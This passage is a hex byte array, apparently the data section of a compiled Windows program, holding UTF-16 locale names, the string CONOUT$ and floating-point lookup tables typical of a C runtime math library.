0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x68, 0x0, 0x73, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x68, 0x0, 0x74, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x63, 0x0, 0x6e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x68, 0x0, 0x6b, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x6d, 0x0, 0x6f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x73, 0x0, 0x67, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x68, 0x0, 0x2d, 0x0, 0x74, 0x0, 0x77, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7a, 0x0, 0x75, 0x0, 0x2d, 0x0, 0x7a, 0x0, 0x61, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x22, 0x5, 0x93, 0x19, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x88, 0x79, 0x1, 0x0, 0xb8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x5, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0xf, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe, 0xe5, 0x26, 0x15, 0x7b, 0xcb, 0xdb, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x78, 0xcb, 0xdb, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x35, 0x95, 0x71, 0x28, 0x37, 0xa9, 0xa8, 0x3e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x13, 0x44, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x25, 0x3e, 0x62, 0xde, 0x3f, 0xef, 0x3, 0x3e, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x60, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0xd5, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9a, 0x99, 0x99, 0x99, 0x99, 0x99, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf8, 0x8f, 0xc0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xfd, 0x7, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xee, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf1, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xe6, 0x54, 0x55, 0x55, 0x55, 0x55, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd4, 0xc6, 0xba, 0x99, 0x99, 0x99, 0x89, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x9f, 0x51, 0xf1, 0x7, 0x23, 0x49, 0x62, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0xff, 0x5d, 0xc8, 0x34, 0x80, 0x3c, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x43, 0x0, 0x4f, 0x0, 0x4e, 0x0, 0x4f, 0x0, 0x55, 0x0, 0x54, 0x0, 0x24, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x90, 0x9e, 0xbd, 0x5b, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xd4, 0xaf, 0x6b, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x95, 0xb9, 0x74, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x76, 0x94, 0x7b, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x4d, 0x34, 0x81, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x8, 0x9b, 0x84, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x71, 0xfe, 0x87, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x90, 0x5e, 0x8b, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x6a, 0xbb, 0x8e, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x83, 0xa, 0x91, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xb5, 0xb5, 0x92, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x4f, 0x5f, 0x94, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x53, 0x7, 0x96, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xc3, 0xad, 0x97, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xa4, 0x52, 0x99, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xf9, 0xf5, 0x9a, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xc3, 0x97, 0x9c, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x6, 0x38, 0x9e, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xc5, 0xd6, 0x9f, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x1, 0xba, 0xa0, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xe1, 0x87, 0xa1, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x2, 0x55, 0xa2, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x67, 0x21, 0xa3, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x11, 0xed, 0xa3, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x1, 0xb8, 0xa4, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x38, 0x82, 0xa5, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xb9, 0x4b, 0xa6, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x83, 0x14, 0xa7, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x98, 0xdc, 0xa7, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xfa, 0xa3, 0xa8, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xaa, 0x6a, 0xa9, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xa9, 0x30, 0xaa, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xf9, 0xf5, 0xaa, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x9a, 0xba, 0xab, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x8d, 0x7e, 0xac, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xd5, 0x41, 0xad, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x71, 0x4, 0xae, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x64, 0xc6, 0xae, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xae, 0x87, 0xaf, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x28, 0x24, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x26, 0x84, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0x90, 0xd2, 0xe3, 0xb0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x2c, 0x43, 0xb1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x34, 0xa2, 0xb1, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xeb, 0x0, 0xb2, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x52, 0x5f, 0xb2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x68, 0xbd, 0xb2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x30, 0x1b, 0xb3, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xa8, 0x78, 0xb3, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xd3, 0xd5, 0xb3, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xaf, 0x32, 0xb4, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x3e, 0x8f, 0xb4, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x81, 0xeb, 0xb4, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x77, 0x47, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x21, 0xa3, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x80, 0xfe, 0xb5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x94, 0x59, 0xb6, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x5d, 0xb4, 0xb6, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xdd, 0xe, 0xb7, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x14, 0x69, 0xb7, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x1, 0xc3, 0xb7, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xa6, 0x1c, 0xb8, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x3, 0x76, 0xb8, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x18, 0xcf, 0xb8, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xe6, 0x27, 0xb9, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x6d, 0x80, 0xb9, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xae, 0xd8, 0xb9, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xa9, 0x30, 0xba, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x5f, 0x88, 0xba, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xd0, 0xdf, 0xba, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xfc, 0x36, 0xbb, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xe4, 0x8d, 0xbb, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x89, 0xe4, 0xbb, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xea, 0x3a, 0xbc, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x8, 0x91, 0xbc, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xe4, 0xe6, 0xbc, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x7d, 0x3c, 0xbd, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xd5, 0x91, 0xbd, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xec, 0xe6, 0xbd, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xc1, 0x3b, 0xbe, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x56, 0x90, 0xbe, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xab, 0xe4, 0xbe, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xc0, 0x38, 0xbf, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x96, 0x8c, 0xbf, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x2d, 0xe0, 0xbf, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xc2, 0x19, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x4f, 0x43, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xbd, 0x6c, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xc, 0x96, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x3d, 0xbf, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x4f, 0xe8, 0xc0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x42, 0x11, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x18, 0x3a, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xd0, 0x62, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x6a, 0x8b, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xe7, 0xb3, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x46, 0xdc, 0xc1, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x88, 0x4, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xac, 0x2c, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xb4, 0x54, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x9f, 0x7c, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x6e, 0xa4, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x20, 0xcc, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0x90, 0xb6, 0xf3, 0xc2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x30, 0x1b, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x8e, 0x42, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xd0, 0x69, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xf6, 0x90, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x1, 0xb8, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xf0, 0xde, 0xc3, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xc5, 0x5, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x7e, 0x2c, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x1c, 0x53, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xa0, 0x79, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x9, 0xa0, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x58, 0xc6, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x8c, 0xec, 0xc4, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xa6, 0x12, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xa6, 0x38, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x8c, 0x5e, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x58, 0x84, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xb, 0xaa, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xa4, 0xcf, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x24, 0xf5, 0xc5, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x8a, 0x1a, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xd8, 0x3f, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xc, 0x65, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x28, 0x8a, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x2b, 0xaf, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x15, 0xd4, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xe7, 0xf8, 0xc6, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xa1, 0x1d, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x42, 0x42, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xcc, 0x66, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x3d, 0x8b, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x97, 0xaf, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xd9, 0xd3, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x3, 0xf8, 0xc7, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x16, 0x1c, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x90, 0x11, 0x40, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xf5, 0x63, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xc2, 0x87, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x79, 0xab, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x18, 0xcf, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xa0, 0xf2, 0xc8, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x12, 0x16, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x6d, 0x39, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xb2, 0x5c, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xe1, 0x7f, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xf9, 0xa2, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0x70, 0xfb, 0xc5, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0xe7, 0xe8, 0xc9, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xbd, 0xb, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x7e, 0x2e, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x29, 0x51, 0xca, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xbe, 0x73, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x3e, 0x96, 0xca, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xa8, 0xb8, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x20, 0xfe, 0xda, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x3e, 0xfd, 0xca, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x69, 0x1f, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x7f, 0x41, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x80, 0x63, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x6c, 0x85, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x44, 0xa7, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x7, 0xc9, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0xb6, 0xea, 0xcb, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x51, 0xc, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xd7, 0x2d, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x49, 0x4f, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xa7, 0x70, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xf1, 0x91, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x27, 0xb3, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x49, 0xd4, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x58, 0xf5, 0xcc, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x53, 0x16, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x3a, 0x37, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xe, 0x58, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x0, 0xcf, 0x78, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x7c, 0x99, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x16, 0xba, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x9d, 0xda, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x11, 0xfb, 0xcd, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x73, 0x1b, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0xc1, 0x3b, 0xce, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xfd, 0x5b, 0xce, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x26, 0x7c, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x3c, 0x9c, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x40, 0xbc, 0xce, 0x3f, 0x0, 0x0, 0x0, 0x80, 0x32, 0xdc, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x11, 0xfc, 0xce, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xde, 0x1b, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x99, 0x3b, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x42, 0x5b, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xd9, 0x7a, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x5e, 0x9a, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x90, 0xd1, 0xb9, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x32, 0xd9, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x82, 0xf8, 0xcf, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xe0, 0xb, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x76, 0x1b, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x4, 0x2b, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x89, 0x3a, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x5, 0x4a, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0x78, 0x59, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xe3, 0x68, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x46, 0x78, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x80, 0xa0, 0x87, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xf2, 0x96, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x3b, 0xa6, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0x7b, 0xb5, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xb4, 0xc4, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x60, 0xe4, 0xd3, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x30, 0xc, 0xe3, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x2b, 0xf2, 0xd0, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x43, 0x1, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x52, 0x10, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0x59, 0x1f, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x58, 0x2e, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x4f, 0x3d, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x3d, 0x4c, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x24, 0x5b, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x3, 0x6a, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x50, 0xda, 0x78, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xa9, 0x87, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x70, 0x96, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x2f, 0xa5, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x10, 0xe7, 0xb3, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x96, 0xc2, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x3e, 0xd1, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xf0, 0xde, 0xdf, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x77, 0xee, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x8, 0xfd, 0xd1, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x91, 0xb, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x13, 0x1a, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x8d, 0x28, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x10, 0x0, 0x37, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x30, 0x6b, 0x45, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0xce, 0x53, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x2b, 0x62, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xd0, 0x7f, 0x70, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x40, 0xcd, 0x7e, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x60, 0x13, 0x8d, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x52, 0x9b, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xa0, 0x89, 0xa9, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xb9, 0xb7, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xe0, 0xe2, 0xc5, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xb0, 0x4, 0xd4, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x50, 0x1f, 0xe2, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0xc0, 0x32, 0xf0, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x20, 0x3f, 0xfe, 0xd2, 0x3f, 0x0, 0x0, 0x0, 0x70, 0x44, 0xc, 0xd3, 0x3f, 0x0, 0x0, 0x0, 0xb0, 